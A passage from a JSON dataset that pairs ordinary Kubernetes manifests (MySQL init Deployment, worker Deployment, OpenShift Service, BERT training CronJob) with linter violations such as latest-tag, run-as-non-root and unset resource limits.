hostPath:\n          path: /var/lib/mysqlx/initdbd-debug\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initdbd\" has cpu request 0"
  },
  {
    "id": "7896",
    "manifest_path": "data/manifests/the_stack_sample/sample_2906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: initdbd-deploy\n  labels:\n    app: initdbd\n    version: v1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: initdbd\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: initdbd\n        version: v1\n    spec:\n      containers:\n      - name: initdbd\n        image: mysql:8.0\n        imagePullPolicy: Always\n        env:\n        - name: MYSQL_SVC\n          value: $(MYSQL_SVC)\n        command:\n        - bash\n        - -c\n        - \"while true;do\\n  echo \\\"${MYSQL_SVC}\\\"\\n\\n  if [[ $(mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot -e \\\"use test_db;show tables;\\\") ]]; then\\n    sleep 100s\\n   \\\n          \\ continue\\n  fi\\n\\n  if [ -d /initdbd ]; then\\n    cd /initdbd\\n    mysql\\\n          \\ -h \\\"${MYSQL_SVC}\\\" -uroot < ping_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot < user_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\" -uroot -e \\\"use\\\n          \\ test_db;show tables;\\\"\\n  fi\\n\\n  sleep 1s\\ndone\\n\"\n        volumeMounts:\n        - name: initdbd-vol\n          mountPath: /initdbd\n      volumes:\n      - name: initdbd-vol\n        hostPath:\n          path: /var/lib/mysqlx/initdbd-debug\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initdbd\" has memory limit 0"
  },
  {
    "id": "7897",
    "manifest_path": "data/manifests/the_stack_sample/sample_2907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workerservice\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workerservice\n  template:\n    metadata:\n      labels:\n        app: workerservice\n    spec:\n      containers:\n      - name: workerservice\n        image: involvedcafe202007.azurecr.io/workerservice:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"workerservice\" is using an invalid container image, \"involvedcafe202007.azurecr.io/workerservice:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7898",
    "manifest_path": "data/manifests/the_stack_sample/sample_2907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workerservice\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workerservice\n  template:\n    metadata:\n      labels:\n        app: workerservice\n    spec:\n      containers:\n      - name: workerservice\n        image: involvedcafe202007.azurecr.io/workerservice:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"workerservice\" does not have a read-only root file system"
  },
  {
    "id": "7899",
    "manifest_path": "data/manifests/the_stack_sample/sample_2907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workerservice\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workerservice\n  template:\n    metadata:\n      labels:\n        app: workerservice\n    spec:\n      containers:\n      - name: workerservice\n        image: involvedcafe202007.azurecr.io/workerservice:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"workerservice\" is not set to runAsNonRoot"
  },
  {
    "id": "7900",
    "manifest_path": "data/manifests/the_stack_sample/sample_2907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workerservice\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workerservice\n  template:\n    metadata:\n      labels:\n        app: workerservice\n    spec:\n      containers:\n      - name: workerservice\n        image: involvedcafe202007.azurecr.io/workerservice:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"workerservice\" has cpu request 0"
  },
  {
    "id": "7901",
    "manifest_path": "data/manifests/the_stack_sample/sample_2909.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.alpha.openshift.io/serving-cert-secret-name: openshift-service-catalog-apiserver-operator-serving-cert\n  labels:\n    app: openshift-service-catalog-apiserver-operator\n  name: metrics\n  namespace: openshift-service-catalog-apiserver-operator\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: openshift-service-catalog-apiserver-operator\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:openshift-service-catalog-apiserver-operator])"
  },
  {
    "id": "7902",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "7903",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "7904",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "7905",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "7906",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "7907",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "7908",
    "manifest_path": "data/manifests/the_stack_sample/sample_2912.yaml",
